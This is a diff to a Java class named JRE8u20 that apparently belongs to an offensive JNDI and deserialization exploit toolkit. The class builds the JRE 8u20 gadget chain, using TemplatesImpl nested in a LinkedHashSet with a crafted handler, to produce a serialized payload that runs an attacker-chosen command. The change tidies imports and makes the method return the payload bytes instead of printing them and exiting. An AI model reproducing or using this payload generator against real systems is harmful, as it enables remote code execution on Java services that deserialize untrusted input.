@@ -3,17 +3,17 @@ package com.qi4l.jndi.gadgets;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
-import com.qi4l.jndi.gadgets.utils.Gadgets;
-import com.qi4l.jndi.gadgets.utils.GadgetsYso;
-import com.qi4l.jndi.gadgets.utils.JavaVersion;
-import com.qi4l.jndi.gadgets.utils.Reflections;
+import com.qi4l.jndi.gadgets.utils.*;
 import com.qi4l.jndi.gadgets.utils.jre.*;
+import com.qi4l.jndi.gadgets.utils.jre.Util;
 
 import javax.xml.transform.Templates;
 import java.beans.beancontext.BeanContextChild;
 import java.beans.beancontext.BeanContextSupport;
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -75,7 +75,7 @@ public class JRE8u20 implements ObjectPayload<Object> {
     public Object getObject(PayloadType type, String... param) throws Exception {
         String                  command   = param[0];
         Serialization           ser       = new Serialization();
-        Object                  templates = makeTemplates(type,param);
+        Object                  templates = makeTemplates(type, param);
         HashMap<Object, Object> map       = new HashMap<Object, Object>();
         map.put("f5a5a608", templates);
         TCObject            handler           = makeHandler(map, ser);
@@ -95,9 +95,15 @@ public class JRE8u20 implements ObjectPayload<Object> {
         linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
         linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);
         ser.addObject(linkedHashset);
-        ser.write(System.out);
-        System.exit(0);
-        return ser;
+
+        if (JYsoMode.contains("yso")) {
+            ser.write(System.out);
+            System.exit(0);
+        }
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        ser.write(out);
+        byte[] bytes = out.toByteArray();
+        return bytes;
     }
 
     public static boolean isApplicableJavaVersion() {
